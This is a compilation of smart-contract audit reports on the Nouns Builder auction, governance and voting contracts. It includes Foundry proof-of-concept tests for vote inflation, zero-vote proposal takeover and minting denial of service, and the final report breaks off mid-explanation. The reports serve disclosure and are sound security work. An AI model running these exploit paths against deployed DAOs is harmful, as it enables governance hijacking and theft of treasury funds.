# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L204 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L206 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L235   # Vulnerability details  # Vulnerability details  ## Description  There is a function `_createAuction` in `Auction` contract.  It consist the following logic:  ``` /// @dev Creates an auction for the next token function _createAuction() private {     // Get the next token available for bidding     try token.mint() returns (uint256 tokenId) {         **creating of the auction for token with id equal to tokenId**          // Pause the contract if token minting failed     } catch Error(string memory) {         _pause();     } } ```  According to the [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md) `call` opcode can consume as most `63/64` of parrent calls' gas. That means `token.mint()` can fail since there will be no gas.   All in all, if `token.mint()` fail on gas and the rest gas is enough for pausing the contract by calling `_pause` in `catch` statement the contract will be paused.  Please note, that a bug can be exploitable if the token.mint() consume more than 1.500.000 of gas, because 1.500.000 / 64 > 20.000 that need to pause the contract. Also, the logic of `token.mint()` includes traversing the array up to 100 times, that's heavy enough to reach 1.500.000 gas limit.   ## Impact  Contract can be paused by any user by passing special amount of gas for the call of `settleCurrentAndCreateNewAuction` (which consists of two internal calls of `_settleAuction` and `_createAuction` functions).  ## Recommended Mitigation Steps  Add a special check for upper bound of `gasLeft` at start of `_createAuction` function.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456   # Vulnerability details  ## Impact When determining the proposal's state, the following `state` function is called, which can execute `else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) { return ProposalState.Defeated; }`. If `proposal.forVotes` and `proposal.againstVotes` are the same, the proposal is not considered defeated when the quorum votes are reached by the for votes. However, many electoral systems require that the for votes to be more than the against votes in order to conclude that the proposal is passed because the majority of votes supports it. If the deployed DAO wants to require the majority of votes to support a proposal in order to pass it, the `state` function would incorrectly conclude that the proposal is not defeated when the for votes and against votes are the same at the end of voting. As a result, critical proposals, such as for updating implementations or withdrawing funds from the treasury, that should not be passed can be passed, or vice versa, so the impact can be huge.  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456 ```solidity     function state(bytes32 _proposalId) public view returns (ProposalState) {         // Get a copy of the proposal         Proposal memory proposal = proposals[_proposalId];          // Ensure the proposal exists         if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();          // If the proposal was executed:         if (proposal.executed) {             return ProposalState.Executed;              // Else if the proposal was canceled:         } else if (proposal.canceled) {             return ProposalState.Canceled;              // Else if the proposal was vetoed:         } else if (proposal.vetoed) {             return ProposalState.Vetoed;              // Else if voting has not started:         } else if (block.timestamp < proposal.voteStart) {             return ProposalState.Pending;              // Else if voting has not ended:         } else if (block.timestamp < proposal.voteEnd) {             return ProposalState.Active;              // Else if the proposal failed (outvoted OR didn't reach quorum):         } else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {             return ProposalState.Defeated;              // Else if the proposal has not been queued:         } else if (settings.treasury.timestamp(_proposalId) == 0) {             return ProposalState.Succeeded;              // Else if the proposal can no longer be executed:         } else if (settings.treasury.isExpired(_proposalId)) {             return ProposalState.Expired;              // Else the proposal is queued         } else {             return ProposalState.Queued;         }     } ```  ## Proof of Concept Please append the following test in `test\Gov.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity     function test_ProposalIsSucceededWhenNumberOfForAndAgainstVotesAreSame() public {         vm.prank(founder);         auction.unpause();          createVoters(7, 5 ether);          vm.prank(address(treasury));         governor.updateQuorumThresholdBps(2000);          bytes32 proposalId = createProposal();          vm.warp(block.timestamp + governor.votingDelay());          // number of for and against votes are both 2         castVotes(proposalId, 2, 2, 3);          vm.warp(block.timestamp + governor.votingPeriod());          // the proposal is considered succeeded when number of for and against votes are the same after voting ends         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Succeeded));          // the proposal can be queued afterwards         governor.queue(proposalId);         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Queued));     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps If there is no need to pass a proposal when `proposal.forVotes` and `proposal.againstVotes` are the same at the end of voting, then https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441-L442 can be changed to the following code. ```solidity         } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {             return ProposalState.Defeated; ```  Otherwise, a governance configuration can be added to indicate whether the majority of votes is needed or not for supporting and passing a proposal. The `state` function then could return `ProposalState.Defeated` when `proposal.forVotes <= proposal.againstVotes` if so and when `proposal.forVotes < proposal.againstVotes` if not.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L188-L198   # Vulnerability details  ## Description  When a token is minted, the ```MetadataRenderer.sol``` ```onMinted``` function is called which will set the particular token's attributes to a random item from one of the properties. A token has a maximum of 16 attributes, the first one being the total number of properties. The properties from which the token receives its attributes are supplied by the owner of the ```MetadataRenderer.sol``` contract by calling ```addProperties```. The issue is that the number of properties the owner can supply is not limited. If the number of properties is more than 15 then the ```onMinted``` function will revert due to the limit on the number of attributes a token may have.  ## Impact  Since ```onMinted``` is always called when tokens are minted, the DAO will not be able to mint new tokens. There does not seem to be a way to remove properties so this would be unrecoverable.  ## Proof of Concept  Test code added to ```Token.t.sol```: ```solidity     function test_MetadataProperties() public {         createUsers(2, 1 ether);          address[] memory wallets = new address[](2);         uint256[] memory percents = new uint256[](2);         uint256[] memory vestExpirys = new uint256[](2);          uint256 pct = 50;         uint256 end = 4 weeks;          unchecked {             for (uint256 i; i < 2; ++i) {                 wallets[i] = otherUsers[i];                 percents[i] = pct;                 vestExpirys[i] = end;             }         }          deployWithCustomFounders(wallets, percents, vestExpirys);          // Check deployed correctly         assertEq(token.totalFounders(), 2);         assertEq(token.totalFounderOwnership(), 100);          // Create 16 properties and items         string[] memory names = new string[](16);         MetadataRendererTypesV1.ItemParam[] memory items = new MetadataRendererTypesV1.ItemParam[](16);         for (uint256 j; j < 16; j++) {             names[j] = "aaa";                                                                               // Add random properties             items[j].name = "aaa";                                                                          // Add random items             items[j].propertyId = uint16(j);                                                                // Make sure all properties have items             items[j].isNewProperty = true;         }          MetadataRendererTypesV1.IPFSGroup memory group = MetadataRendererTypesV1.IPFSGroup(             "aaa",             "aaa"         );                                                                                                  // Add random IPFS group          // Add 16 properties         vm.prank(otherUsers[0]);         metadataRenderer.addProperties(names, items, group);          // Attempt to mint         vm.prank(address(auction));         vm.expectRevert(stdError.indexOOBError);         token.mint();     } ```  The test code above shows that the owner of ```MetadataRenderer.sol``` is able to add 16 properties with 1 items each. The ```auction``` contract is then unable to mint due to an "Index out of bounds" error.  Code from the ```onMinted``` function in ```MetadataRenderer.sol```: ```solidity             // For each property:             for (uint256 i = 0; i < numProperties; ++i) {                 // Get the number of items to choose from                 uint256 numItems = properties[i].items.length;                  // Use the token's seed to select an item                 tokenAttributes[i + 1] = uint16(seed % numItems);                  // Adjust the randomness                 seed >>= 16;             } ```  The code above shows that when a token is minted and ```onMinted``` is called it will attempt to assign more than 16 attributes to the token which is not possible due to the ```tokenAttributes``` being limited to 16.  ## Recommended Mitigation Steps  The maximum amount of properties an owner can add should be less than the maximum amount of attributes any token can have. Consider either limiting the ```properties``` variable in ```MetadataRenderer.sol``` to 15 or allow any number of attributes to be added to a token.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L588   # Vulnerability details  ## Impact  The protocol assumes founders and proposals will set sane settings. However there are some settings that if set incorrectly will block proposals from being created or succeeding and block auctions from completing.  This vulnerability has a low likelihood of occurrence as the outcome is not in the interest of the community. However the possibility exists if there is some misunderstanding or miscalculation. If a bad setting is allowed the impact is high.  ## Proof of Concept  ### Bricking governance proposals  **Governor settings.quorumThresholdBps > 10_000**  If `quorumThresholdBps` is set above 10_000 then it would be impossible to get enough votes to succeed.  Without being able to execute a proposal the setting itself could never be fixed.  **Governor settings.proposalThresholdBps > 10_000**  If `proposalThresholdBps` is set above 10_000 then it would be impossible to submit a proposal.  Without being able to submit a proposal the setting itself could never be fixed.  ### Stalling a governance proposal  **Treasury settings.delay**  A very large value for `delay` would prevent a proposal from being executed.  For example 1000 years easily fits into `delay` and would result in a 1000 year wait before being able to execute.  A governance proposal could fix this property for future proposals but any proposal created with the large `delay` would remain stuck.  ### Stalling the auction  **Auction settings.duration**  The `duration` value is in seconds and any value up to type(uint40).max is permitted.  That is `1099511627775` seconds which is > 48000 years.  A large value like this would stop the auction from ever ending and thus stop new NFTs from being minted.  A governance proposal could fix this setting but ideally a very large `duration` would be blocked.  **Auction settings.timeBuffer**  Similar to duration but applies to the auction endTime extention.  So the auction could be extended a number of years for example.  ## Tools Used  Manual review.  ## Recommended Mitigation Steps  Implement reasonable range bounds reverting where appropriate. In particular for the above apply: - Governor settings `quorumThresholdBps` <= 10_000 - Governor settings `proposalThresholdBps` <= 10_000 - Treasury settings `delay` <= 6 months - Auction settings `duration` <= 6 months - Auction settings `timeBuffer` <= 6 months  Add these checks to the `initialize()` functions and in the setter / update functions where these individual settings properties can be updated. 
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190   # Vulnerability details  ERC721Votes's delegate() and delegateBySig() allow the delegation to zero address, which result in owner's votes elimination in the checkpoint. I.e. the votes are subtracted from the owner, but aren't added anywhere. _moveDelegateVotes() invoked by _delegate() treats the corresponding call as a burning, erasing the votes.  The impact is that the further transfer and burning attempts for the ids of the owner will be reverted because _afterTokenTransfer() callback will try to reduce owner's votes, which are already zero, reverting the calls due to subtraction fail.  As ERC721Votes is parent to Token the overall impact is governance token burning and transfer being disabled whenever the owner delegated to zero address. This can be done deliberately, i.e. any owner can disable burning and transfer of the owned ids at any moment, which can interfere with governance voting process.  ## Proof of Concept  User facing delegate() and delegateBySig() allow for zero address delegation:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135  ```solidity     /// @notice Delegates votes to an account     /// @param _to The address delegating votes to     function delegate(address _to) external {         _delegate(msg.sender, _to);     } ```  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L144-L174  ```solidity     function delegateBySig(         address _from,         address _to,         uint256 _deadline,         uint8 _v,         bytes32 _r,         bytes32 _s     ) external {         // Ensure the signature has not expired         if (block.timestamp > _deadline) revert EXPIRED_SIGNATURE();          // Used to store the digest         bytes32 digest;          // Cannot realistically overflow         unchecked {             // Compute the hash of the domain seperator with the typed delegation data             digest = keccak256(                 abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR(), keccak256(abi.encode(DELEGATION_TYPEHASH, _from, _to, nonces[_from]++, _deadline)))             );         }          // Recover the message signer         address recoveredAddress = ecrecover(digest, _v, _r, _s);          // Ensure the recovered signer is the voter         if (recoveredAddress == address(0) || recoveredAddress != _from) revert INVALID_SIGNATURE();          // Update the delegate         _delegate(_from, _to);     } ```  And pass zero address to the _delegate() where it is being set:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  In this case _moveDelegateVotes() will reduce the votes from the owner, not adding it to anywhere as `_from` is the owner, while `_to` is zero address:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L203-L220  ```solidity             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 }                  // If this isn't a token burn:                 if (_to != address(0)) { // @ audit here we add the votes to the target, but only if it's not zero address ```  The owner might know that and can use such a delegation to interfere with the system by prohibiting of transferring/burning of his ids.  This happens via _afterTokenTransfer() reverting as it's becomes impossible to reduce owner's votes balance by `1`:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L271  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1);          super._afterTokenTransfer(_from, _to, _tokenId);     } ```  ## Recommended Mitigation Steps  Consider prohibiting zero address as a delegation destination:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal { +  if (_to == address(0)) revert INVALID_SIGNATURE();          // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  When `_to` isn't zero there always be an addition in _moveDelegateVotes(), so the system votes balance will be sustained.    
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268   # Vulnerability details  ## Impact  `aftertokenTransfer` in ERC721Votes transfers votes between user addresses instead of the delegated addresses, so a user can cause overflow in `_moveDelegates` and get unlimited votes  ## Proof of Concept  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268  ```     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1);          super._afterTokenTransfer(_from, _to, _tokenId);     } ``` https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216  ```     _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     ...     unchecked {                 ...                 // Update their voting weight                 _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);             } ``` During delegation `balanceOf(from)` amount of votes transferred are to the `_to` address  ```     function test_UserCanGetUnlimitedVotes() public {          vm.prank(founder);         auction.unpause();          vm.prank(bidder1);         auction.createBid{ value: 1 ether }(2);          vm.warp(10 minutes + 1 seconds);          auction.settleCurrentAndCreateNewAuction();                  assertEq(token.ownerOf(2), bidder1);          console.log(token.getVotes(bidder1)); // 1         console.log(token.delegates(bidder1)); // 0 bidder1          vm.prank(bidder1);         token.delegate(bidder2);          console.log(token.getVotes(bidder1)); // 1         console.log(token.getVotes(bidder2)); // 1          vm.prank(bidder1);         auction.createBid{value: 1 ether}(3);          vm.warp(22 minutes);          auction.settleCurrentAndCreateNewAuction();          assertEq(token.ownerOf(3), bidder1);          console.log(token.balanceOf(bidder1)); // 2         console.log(token.getVotes(bidder1)); // 2         console.log(token.getVotes(bidder2)); // 1          vm.prank(bidder1);                 token.delegate(bidder1);          console.log(token.getVotes(bidder1)); // 4         console.log(token.getVotes(bidder2)); // 6277101735386680763835789423207666416102355444464034512895        } ```  When user1 delegates to another address `balanceOf(user1)` amount of tokens are subtraced from user2's votes, this will cause underflow and not revert since the statements are unchecked  ## Tools Used  foundry  ## Recommended Mitigation Steps  Change delegate transfer in `afterTokenTransfer` to   ```         _moveDelegateVotes(delegates(_from), delegates(_to), 1); ```  
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L307-L335   # Vulnerability details  ## Impact  The auction parameters can be changed anytime, even during ongoing auctions, and take effect immediately. Users may need time to react to the changes. The impacts maybe followings: - some sudden changes may cause bidder's transaction fail, such as `setReservePrice()` and `setMinimumBidIncrement()` - some changes may change users expectation about the auction, such as `setDuration()` and `setTimeBuffer()`, with different time parameters, bidders will use different strategy   ## Proof of Concept  src/auction/Auction.sol ```solidity     function setDuration(uint256 _duration) external onlyOwner {         settings.duration = SafeCast.toUint40(_duration);          emit DurationUpdated(_duration);     }      function setReservePrice(uint256 _reservePrice) external onlyOwner {         settings.reservePrice = _reservePrice;          emit ReservePriceUpdated(_reservePrice);     }      function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {         settings.timeBuffer = SafeCast.toUint40(_timeBuffer);          emit TimeBufferUpdated(_timeBuffer);     }      function setMinimumBidIncrement(uint256 _percentage) external onlyOwner {         settings.minBidIncrement = SafeCast.toUint8(_percentage);          emit MinBidIncrementPercentageUpdated(_percentage);     }```   ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  - do not apply changed parameters on ongoing auctions  - add a timelock for the changes  
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441   # Vulnerability details  It's possible to create a proposal for a DAO as soon as it's deployed and the proposal can pass even if nobody votes.  This possibility of doing so is based on the following assumptions: 1. The vetoer doesn't veto the proposal 2. `proposal.quorumVotes` is 0, which happens when `token.totalSupply() * settings.quorumThresholdBps < 10_000` 3. `proposal.proposalThreshold` is 0, which happens when `token.totalSupply() * settings.proposalThresholdBps < 10_000`  The amount of time necessary to create and execute a proposal of this kind is dictated by `governor.settings.votingDelay + governor.settings.votingDelay + treasury.delay()`, the lower the time the higher the risk.  ## Impact A malicious actor could build an off-chain script that tracks `DAODeployed` events on the `Manager.sol` contract. Every time a new DAO is spawned the script submits a proposal. This attack is based on the fact that such at an early stage nobody might notice and the chances of this happening are made real because every new DAO can be targeted.   A potential proposal created by an attacker might look like this: 1. Call `governor.updateVetoer(attacker)` 1. Call `governor.updateVotingDelay(0)` 2. Call `governor.updateVotingPeriod(0)` 3. Call `treasury.updateGracePeriod(0)` 4. Call `treasury.updateDelay(1 day)`  With this setup the attacker can make a proposal and queue it immediately to then execute it after 1 day time; which gives him the time to veto any proposal that tries to interfere with the attack. At this point the attacker has sudo powers and if there's any bid he can take the funds.  This is just one possible attack path, but the point is making a proposal pass can give an attacker sudo powers and nobody might notice for a while.  ## Proof of Concept Here's a test I wrote that proves the attack path outlined above, you can copy it into `Gov.t.sol` and execute it with `forge test -m test_sneakProposalAttack`:  ```javascript  function test_sneakProposalAttack() public {         address attacker = vm.addr(0x55);          address[] memory targets = new address[](5);         uint256[] memory values = new uint256[](5);         bytes[] memory calldatas = new bytes[](5);          // 1. Call `governor.updateVetoer(attacker)`         targets[0] = address(governor);         values[0] = 0;         calldatas[0] = abi.encodeWithSignature("updateVetoer(address)", attacker);          // 2. Call `governor.updateVotingDelay(0)`         targets[1] = address(governor);         values[1] = 0;         calldatas[1] = abi.encodeWithSignature("updateVotingDelay(uint256)", 0);          //3. Call `governor.updateVotingPeriod(0)`         targets[2] = address(governor);         values[2] = 0;         calldatas[2] = abi.encodeWithSignature("updateVotingPeriod(uint256)", 0);          //3. Call `treasury.updateGracePeriod(0)`         targets[3] = address(treasury);         values[3] = 0;         calldatas[3] = abi.encodeWithSignature("updateGracePeriod(uint256)", 0);          //4. Call `treasury.updateDelay(1 day)`         targets[4] = address(treasury);         values[4] = 0;         calldatas[4] = abi.encodeWithSignature("updateDelay(uint256)", 60 * 60 * 24);          //Attacker creates proposal as soon as contract is deployed         bytes32 proposalId = governor.propose(targets, values, calldatas, "");          //Wait for proposal.voteEnd         vm.warp((governor.getProposal(proposalId).voteEnd));          //Queue it         governor.queue(proposalId);          //Wait for treasury delay         vm.warp(block.timestamp + treasury.delay());          //Execute proposal         governor.execute(targets, values, calldatas, keccak256(bytes("")));          //Shows it's now possible for an attacker to queue a proposal immediately         bytes32 proposalId2 = governor.propose(targets, values, calldatas, "mock");         governor.queue(proposalId2);          //And executed it after one day         vm.warp(block.timestamp + 60 * 60 * 24);         governor.execute(targets, values, calldatas, keccak256(bytes("mock")));     }  ```  ## Recommended Mitigation Steps This potential attack path comes from a combination of factors, maninly: 1. A proposal can be created directly after deployment 2. The `proposal.proposal.proposalThreshold` and `proposal.quorumVotes` are set to 0 at such early stages 3. A proposal with 0 votes is allowed to pass  I would say that requiring at least 1 vote for a proposal to be considered `Succeeded` is rational and should mitigate this problem because that would require the attacker to bid on auction to get 1 voting power, increasing the cost and the time necessary for the attack.  At [Governor.sol#L441](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441) we have:  ```javscript else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {         return ProposalState.Defeated; } ``` which can be changed to: ```javscript else if (proposal.forVotes == 0 || proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {         return ProposalState.Defeated; } ``` 
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L475 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L524   # Vulnerability details  Because the following happens:  1. Burned tokens votes are effectively deleted in `token._moveDelegateVotes()` when called by `token.burn()` 2. When an auction gets settled without bidders the function burns the token by calling `token.burn()` 3. When `_createAuction()` is called an amount of tokens >= 1 is minted, of which 1 is kept in the auction contract 4. The functions `governor.proposalThreshold()` and `governor.quorum()` both depend on `token.totalSupply()` for their calculations.  We can derive that the protocol calculates the `quorumVotes` taking into account burned tokens and tokens held in the auction contract, which don't have any actual voting power. In other words the actual `quorumThresholdBps` is equal or higher than the setted `quorumThresholdBps`.  ## Impact The worse case scenario that can happen is that the quorum gets so high that a proposal cannot pass even if everybody voted and everybody voted `for`, potentially locking funds into the contract.  We can define:  1. `assumedVotingPower` = `token.totalSupply()` 2. `realVotingPower` = `token.totalSupply() - amountOfTokensBurned` 3. `Î”VotingPower` = `amountOfTokensBurned`   This is the case if:  ``` realVotingPower at proposal.voteEnd < quorum at proposal.timeCreated ``` which is the same as  ``` realVotingPower < (assumedVotingPower * settings.quorumThresholdBps) / 10_000 ``` and rearranging in terms of `settings.quorumThresholdBps` we have:  ``` settings.quorumThresholdBps > 10_000 * realVotingPower/assumedVotingPower ```  Knowing that:  1. The possible range of values for `10_000 * realVotingPower/assumedVotingPower` is from `1` to `10000`. If `realVotingPower = 0` this model doesn't make sense in the first place.   2. The possible range of values of `settings.quorumThresholdBps` is from `1` to `2^16 - 1`. The protocol allows for `settings.quorumThresholdBps` to be `0`, in which case it means that the actual quorum is `0`; a context in which this model doesn't make sense. There's another catch that restricts this boundaries, if `settings.quorumThresholdBps * token.totalSupply()` < `10_000` the output of `governance.quorum()` would be `0`.   Many combinations of values in the ranges described above render this disequation true, note, however, that this describes the workings in a mathematical settings and it doesnt hold true for every case in a real setting because of roundings and approximations.  We can intuitevely notice that when `realVotingPower/assumedVotingPower` is very low, which is the case of a DAO with few tokens burned, the chances of the disequation being true are slim and when it's high the chances of the disequation being true become higher. The opposite is true for `settings.quorumThresholdBps`.  This might lock funds in DAOs with a lot of unsold auctions who have a low `settings.quorumThresholdBps`.  At early stages this is mitigated by the fact that for every possible token burned some tokens are minted to the founders, but when the vest expires this mitigation is not in place anymore.  ## Proof of concept  I wrote a test that's expected to revert a `proposal.queue()` even if all possible votes available are cast in favor.  The test comes with two parameters to set: `auctionsToRun` and `tokensToBidder`. The test runs `auctionsToRun` auctions, of which the first `tokensToBidder` are bidded upon and the rest are not. Then: 1. Creates a proposal 2. Cast all possible votes in favor 3. Tries to queue a proposal 4. Reverts  The default parameters are set to `auctionsToRun = 130` and `tokensToBidder = 10`. Also `quorumThresholdBps = 1000`. This test results in `121 tokens burned` and `133 token minted`. It's quite an unrealistic scenario, but it can get more real if `quorumThresholdBps` is setted lower. Keep in mind that this is the case in which everybody shows up to vote and averybody votes for.  ### Test code The test can be pasted inside `Gov.t.sol` and then run with:  `test -m test_RevertQueueProposalWithEverybodyInFavour`  ```javascript function test_RevertQueueProposalWithEverybodyInFavour() public {     //Number of auctions to run     uint256 auctionsToRun = 130;      //Amount of tokens to bid up     uint256 tokensToBidder = 10;      address bidder1 = vm.addr(0xB1);     vm.deal(founder, 10000 ether);     vm.deal(bidder1, 10000 ether);      //Start the first auction     vm.prank(founder);     auction.unpause();      //Simulates an `auctionsToRun` amount of auctions in which the first `tokensForBidder` tokens     //are minted and then every auction ends with no bidders.     uint256 amountOfBurnedTokens;     for (uint256 i = 1; i < auctionsToRun + 1; ++i) {         if (i < tokensToBidder) {             uint256 id = token.totalSupply() - 1;             vm.prank(bidder1);             auction.createBid{ value: 0.15 ether }(id);         } else {             amountOfBurnedTokens++;         }          vm.warp(block.timestamp + auction.duration() + 1);         auction.settleCurrentAndCreateNewAuction();     }      uint256 founderVotes = token.getVotes(founder);     uint256 founder2Votes = token.getVotes(founder2);     uint256 bidder1Votes = token.getVotes(bidder1);     uint256 auctionVotes = token.getVotes(address(auction));      uint256 realVotingPower = founderVotes + founder2Votes + bidder1Votes;     uint256 assumedVotingPower = token.totalSupply();      assertEq(realVotingPower, assumedVotingPower - amountOfBurnedTokens - auctionVotes);      //Create mock proposal     (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();     vm.prank(bidder1);     bytes32 proposalId = governor.propose(targets, values, calldatas, "");      emit log_string("Amount of tokens minted: ");     emit log_uint(token.totalSupply());      emit log_string("Amount of tokens burned:");     emit log_uint(amountOfBurnedTokens);      emit log_string("---------");      emit log_string("The real quorumThresholdBps is: ");     uint256 realquorumThresholdBps = (governor.getProposal(proposalId).quorumVotes * 10_000) / realVotingPower;     emit log_uint(realquorumThresholdBps);      emit log_string("The assumed quorumThresholdBps is:");     uint256 assumedquorumThresholdBps = (governor.getProposal(proposalId).quorumVotes * 10_000) / token.totalSupply();     emit log_uint(assumedquorumThresholdBps);      emit log_string("---------");      vm.warp(governor.getProposal(proposalId).voteStart);      //Everybody cast a `for` vote     vm.prank(founder);     governor.castVote(proposalId, 1);      vm.prank(founder2);     governor.castVote(proposalId, 1);      vm.prank(bidder1);     governor.castVote(proposalId, 1);      emit log_string("The amount of votes necessary for this proposal to pass is:");     emit log_uint(governor.getProposal(proposalId).quorumVotes);      emit log_string("The amount of for votes in the proposal:");     emit log_uint(governor.getProposal(proposalId).forVotes);      //Proposal still doesn't pass     vm.warp((governor.getProposal(proposalId).voteEnd));     vm.expectRevert(abi.encodeWithSignature("PROPOSAL_UNSUCCESSFUL()"));     governor.queue(proposalId); } ```  ## Tools Used Forge  ## Recommended Mitigation Steps Either one of this 2 options is viable: 1. Decrease `token.totalSupply()` whenever a token gets burned. This might not be expected behaviour from the point of view of external protocols. 2. Adjust the calculations in `proposal.quorum()` and `governor.proposalThreshold()` in such a way that they take into account the burned tokens and the tokens currently held by the auction contract.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L176-L190 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L192-L235   # Vulnerability details  The owner of one or many `ERC721Votes` tokens can double their voting power once (and only once) by delegating to their own address as their first delegation.  ### Scenario This exploit relies on the initial default value of the `delegation` mapping in `ERC721Votes`, which is why it will only work once per address.  First, the token owner must call `delegate` or `delegateBySig`, passing their own address as the delegate:  [`ERC721Votes#delegate`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135)  ```solidity     /// @notice Delegates votes to an account     /// @param _to The address delegating votes to     function delegate(address _to) external {         _delegate(msg.sender, _to);     } ```  This calls into the internal `_delegate` function, with `_from` and `_to` both set to the token owner's address:  [`ERC721Votes#_delegate`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L176-L190)  ```solidity     /// @dev Updates delegate addresses     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  Since this is the token owner's first delegation, the `delegation` mapping does not contain a value for the `_from` address, and `prevDelegate` on L#181 will be set to `address(0)`:  [`ERC721Votes.sol#L180-L181`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L180-L181)  